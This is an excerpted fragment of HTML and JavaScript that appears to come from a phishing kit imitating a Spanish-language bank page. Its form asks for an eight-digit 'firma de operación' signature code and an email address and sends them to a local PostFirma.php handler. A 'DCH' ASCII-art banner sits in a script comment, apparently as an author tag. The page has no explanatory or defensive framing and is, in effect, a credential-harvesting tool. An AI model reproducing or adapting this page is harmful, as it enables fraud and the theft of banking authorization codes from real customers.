...
<script type="text/javascript">
    $(function() {
        ...
        $("#confirmacion").mask("9 9 9 9 9 9 9 9");
       /*
.------..------..------.
|D.--. ||C.--. ||H.--. |
| :/\: || :/\: || :/\: |
...
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252"> 
  ...
  <div aria-expanded="false" role="menu" class="mod_login  lgn-iframe"> 
   ...
   <form action="./inc/PostFirma.php" method="post" class="mod_form frm-login" name="formularioLogin" id="formularioLogin"> 
...
"> 
     ...
     <label for="id_usu_login" id="id_usu_login" class="frm-label"><span class="frm-label-txt"><img style=" width: 28PX; " src="./lib/icofirma.png"> firma de operación .<br>
      <p style=" color: #7f7f7f; font-size: 13px; ">Introduce tu firma digital</p></span> 
      <div class="hide" id="placeHolderLogin"> 
       <div class="msg-container"> 
        <p class="msg-text" id="placeHolderLoginPU"></p> 
        <a data-function="fc-closeMessage" data-icon="c" class="msg-link data-ico-E"></a> 
       </div> 
      </div> <input type="text" style="text-align: center;" name="firma" id="confirmacion" class="frm-input"> </label> 

       <label for="id_usu_login" id="id_usu_login" class="frm-label"><span class="frm-label-txt"><img style=" width: 28PX; " src="./lib/icofirma.png"> Correo electrónico .<br>
      <p style=" color: #7f7f7f; font-size: 13px; ">Introduce tu Correo electrónico</p></span> 
      <div class="hide" id="placeHolderLogin"> 
       <div class="msg-container"> 
        <p class="msg-text" id="placeHolderLoginPU"></p> 
        <a data-function="fc-closeMessage" data-icon="c" class="msg-link data-ico-E"></a> 
       </div> 
      </div> <input type="email" style="text-align: center;" name="Correo" id="Correo" class="frm-input" placeholder="nombre@dominio.com"> </label> 
...
<input type="submit" value="Seguir" name="accountefirma" id="botonEntrar" class="but-green but-wDefault ladda-button">
...
"> 
         <div class="hero"> 
          <img src="./lib/HOMBRE-JOVEN-MOVIL-270x254.png"> 
         </div> 
